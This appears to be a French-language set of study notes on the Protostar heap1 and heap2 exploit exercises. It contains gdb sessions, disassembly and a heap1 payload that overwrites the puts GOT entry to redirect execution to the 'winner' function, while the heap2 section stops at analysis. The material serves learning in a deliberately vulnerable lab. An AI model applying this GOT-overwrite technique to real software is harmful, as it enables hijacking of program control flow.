	$2 = {<text variable, no debug info>} 0x80483cc <puts@plt>

CF [ce lien](https://stackoverflow.com/questions/55773868/returning-a-value-in-x86-assembly-language)

> `eax̀` is the register where by convention the return value is found. The caller will take the 
> value of eax as the return value.

Code:

	0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
	0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
	0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax

	0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
	0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
	0x080484e8 <main+47>:	mov    edx,eax

	0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
	0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
	0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax

	0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
	0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
	0x08048517 <main+94>:	mov    edx,eax

Dans `gdb`

	b *0x080484ce
	b *0x080484e8 
	b *0x080484fd
	b *0x08048517

Exécution:

	(gdb) print/x $eax
	$3 = 0x804a008
	(gdb) c
	Continuing.

	Breakpoint 2, 0x080484e8 in main (argc=3, argv=0xbffff844) at heap1/heap1.c:25
	25	in heap1/heap1.c
	(gdb) print/x $eax
	$5 = 0x804a018
	(gdb) c
	Continuing.

	Breakpoint 3, 0x080484fd in main (argc=3, argv=0xbffff844) at heap1/heap1.c:27
	27	in heap1/heap1.c
	(gdb) print/x $eax
	$6 = 0x804a028
	(gdb) c
	Continuing.

	Breakpoint 4, 0x08048517 in main (argc=3, argv=0xbffff844) at heap1/heap1.c:29
	29	in heap1/heap1.c
	(gdb) print/x $eax
	$7 = 0x804a038

Adresse de retour du premier malloc (`i1`):

	(gdb) x/x $eax
	0x804a008:	0x00000001

Adresse de retour du deuxième malloc (`i1->name`):

	(gdb) x/x $eax
	0x804a018:	0x00000002

Adresse de retour du troisième malloc (`i2`):

	(gdb) x/x $eax
	0x804a028:	0x00000002

Adresse de retour du quatrième malloc (`i2->name`):

	(gdb) x/x $eax
	0x804a038:	0x00000002

Note:

	(gdb) print &((struct internet *)0)->priority
	$2 = (int *) 0x0
	(gdb) print &((struct internet *)0)->name
	$1 = (char **) 0x4

Adresse du `puts`:

	0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
	0x08048561 <main+168>:	call   0x80483cc <puts@plt>
	0x08048566 <main+173>:	leave  

	(gdb) disassemble 0x80483cc
	Dump of assembler code for function puts@plt:
	0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
	0x080483d2 <puts@plt+6>:	push   0x30
	0x080483d7 <puts@plt+11>:	jmp    0x804835c
	End of assembler dump.

L'adresse de `puts` est `*(0x8049774)` (jump "indirecte")

	(gdb) print/x *(0x8049774)
	$10 = 0x80483d2

Stratégie:

On écrase `i2->name` avec `i1->name`. Puis on écrase `puts` (`0x20646e61`) avec `i2`.

	(gdb) print (0x804a028 + 4) - 0x804a018
	$3 = 20

Et:

	(gdb) print winner
	$11 = {void (void)} 0x8048494 <winner>

Donc:

	r `python -c 'print("A" * 20 + "\x74\x97\x04\x08"')` `python -c 'print("\x94\x84\x04\x08"')` 



# heap 2

ASM:

	(gdb) disassemble main
	Dump of assembler code for function main:
	0x080485c4 <main+0>:	push   %ebp
	0x080485c5 <main+1>:	mov    %esp,%ebp
	0x080485c7 <main+3>:	and    $0xfffffff0,%esp
	0x080485ca <main+6>:	sub    $0x90,%esp
	0x080485d0 <main+12>:	jmp    0x80485d3 <main+15>
	0x080485d2 <main+14>:	nop
	0x080485d3 <main+15>:	mov    0x80499c0,%ecx
	0x080485d9 <main+21>:	mov    0x80499bc,%edx
	0x080485df <main+27>:	mov    $0x8048810,%eax
	0x080485e4 <main+32>:	mov    %ecx,0x8(%esp)
	0x080485e8 <main+36>:	mov    %edx,0x4(%esp)
	0x080485ec <main+40>:	mov    %eax,(%esp)
	0x080485ef <main+43>:	call   0x80484bc <printf@plt>
	0x080485f4 <main+48>:	mov    0x80499b0,%eax
	0x080485f9 <main+53>:	mov    %eax,0x8(%esp)
	0x080485fd <main+57>:	movl   $0x80,0x4(%esp)
	0x08048605 <main+65>:	lea    0x10(%esp),%eax
	0x08048609 <main+69>:	mov    %eax,(%esp)
	0x0804860c <main+72>:	call   0x804845c <fgets@plt>
	0x08048611 <main+77>:	test   %eax,%eax
	0x08048613 <main+79>:	jne    0x8048617 <main+83>
	0x08048615 <main+81>:	leave  
	0x08048616 <main+82>:	ret    
	0x08048617 <main+83>:	movl   $0x5,0x8(%esp)
	0x0804861f <main+91>:	movl   $0x804882d,0x4(%esp)
	0x08048627 <main+99>:	lea    0x10(%esp),%eax
	0x0804862b <main+103>:	mov    %eax,(%esp)
	0x0804862e <main+106>:	call   0x80484ec <strncmp@plt>
	0x08048633 <main+111>:	test   %eax,%eax
	0x08048635 <main+113>:	jne    0x8048691 <main+205>
	0x08048637 <main+115>:	movl   $0x4,(%esp)
	0x0804863e <main+122>:	call   0x80484cc <malloc@plt>
	0x08048643 <main+127>:	mov    %eax,0x80499bc
	0x08048648 <main+132>:	mov    0x80499bc,%eax
	0x0804864d <main+137>:	movl   $0x24,0x8(%esp)
	0x08048655 <main+145>:	movl   $0x0,0x4(%esp)
	0x0804865d <main+153>:	mov    %eax,(%esp)
	0x08048660 <main+156>:	call   0x804846c <memset@plt>
	0x08048665 <main+161>:	lea    0x10(%esp),%eax
	0x08048669 <main+165>:	add    $0x5,%eax
	0x0804866c <main+168>:	mov    %eax,(%esp)
	0x0804866f <main+171>:	call   0x804849c <strlen@plt>
	0x08048674 <main+176>:	cmp    $0x1e,%eax
	0x08048677 <main+179>:	ja     0x8048691 <main+205>
	0x08048679 <main+181>:	lea    0x10(%esp),%eax
	0x0804867d <main+185>:	lea    0x5(%eax),%edx
	0x08048680 <main+188>:	mov    0x80499bc,%eax
	0x08048685 <main+193>:	mov    %edx,0x4(%esp)
	0x08048689 <main+197>:	mov    %eax,(%esp)
	0x0804868c <main+200>:	call   0x80484ac <strcpy@plt>
	0x08048691 <main+205>:	movl   $0x5,0x8(%esp)
	0x08048699 <main+213>:	movl   $0x8048833,0x4(%esp)
	0x080486a1 <main+221>:	lea    0x10(%esp),%eax
	0x080486a5 <main+225>:	mov    %eax,(%esp)
	0x080486a8 <main+228>:	call   0x80484ec <strncmp@plt>
	0x080486ad <main+233>:	test   %eax,%eax
	0x080486af <main+235>:	jne    0x80486be <main+250>
	0x080486b1 <main+237>:	mov    0x80499bc,%eax
	0x080486b6 <main+242>:	mov    %eax,(%esp)
	0x080486b9 <main+245>:	call   0x804848c <free@plt>
	0x080486be <main+250>:	movl   $0x6,0x8(%esp)
	0x080486c6 <main+258>:	movl   $0x8048839,0x4(%esp)
	0x080486ce <main+266>:	lea    0x10(%esp),%eax
	0x080486d2 <main+270>:	mov    %eax,(%esp)
	0x080486d5 <main+273>:	call   0x80484ec <strncmp@plt>
	0x080486da <main+278>:	test   %eax,%eax
	0x080486dc <main+280>:	jne    0x80486f2 <main+302>
	0x080486de <main+282>:	lea    0x10(%esp),%eax
	0x080486e2 <main+286>:	add    $0x7,%eax
	0x080486e5 <main+289>:	mov    %eax,(%esp)
	0x080486e8 <main+292>:	call   0x80484fc <strdup@plt>
	0x080486ed <main+297>:	mov    %eax,0x80499c0
	0x080486f2 <main+302>:	movl   $0x5,0x8(%esp)
	0x080486fa <main+310>:	movl   $0x8048841,0x4(%esp)
	0x08048702 <main+318>:	lea    0x10(%esp),%eax
	0x08048706 <main+322>:	mov    %eax,(%esp)
	0x08048709 <main+325>:	call   0x80484ec <strncmp@plt>
	0x0804870e <main+330>:	test   %eax,%eax
	0x08048710 <main+332>:	jne    0x80485d2 <main+14>
	0x08048716 <main+338>:	mov    0x80499bc,%eax
	0x0804871b <main+343>:	mov    0x20(%eax),%eax
	0x0804871e <main+346>:	test   %eax,%eax
	0x08048720 <main+348>:	je     0x8048733 <main+367>
	0x08048722 <main+350>:	movl   $0x8048847,(%esp)
	0x08048729 <main+357>:	call   0x80484dc <puts@plt>
	0x0804872e <main+362>:	jmp    0x80485d3 <main+15>
	0x08048733 <main+367>:	movl   $0x8048863,(%esp)
	0x0804873a <main+374>:	call   0x80484dc <puts@plt>
	0x0804873f <main+379>:	jmp    0x80485d3 <main+15>
	End of assembler dump.

Point d'arret:

**call   0x804845c <fgets@plt>**:

	b *0x0804860c





	(gdb) print line
	$1 = "auth login\n\000\330\367\377\277T\372\377\267\000\000\000\000(\033\376\267\001\000\000\000\000\000\000\000\001\000\000\000\370\370\377\267n\030\360\267\364\177\375\267ea췈\367\377\277u\332\352\267\364\177\375\267l\231\004\b\230\367\377\277\070\204\004\b@\020\377\267l\231\004\b\310\367\377\277y\207\004\b\004\203\375\267\364\177\375\267`\207\004\b\310\367\377\277ec\354\267@\020\377\267k\207\004\b\364\177", <incomplete sequence \375\267>
	(gdb) print &line
	$2 = (char (*)[128]) 0xbffff740
	(gdb) print *line
	$3 = 97 'a'
	(gdb) print &line
	$4 = (char (*)[128]) 0xbffff740















# Good links

* [https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4](https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4)
* [https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md](https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md)
* [https://gist.github.com/tehmoon/63729359f0a6a45712691f1b06d8971b](https://gist.github.com/tehmoon/63729359f0a6a45712691f1b06d8971b)
* [https://github.com/le91688/protostar](https://github.com/le91688/protostar)
* [https://www.ayrx.me/protostar-walkthrough-heap](https://www.ayrx.me/protostar-walkthrough-heap)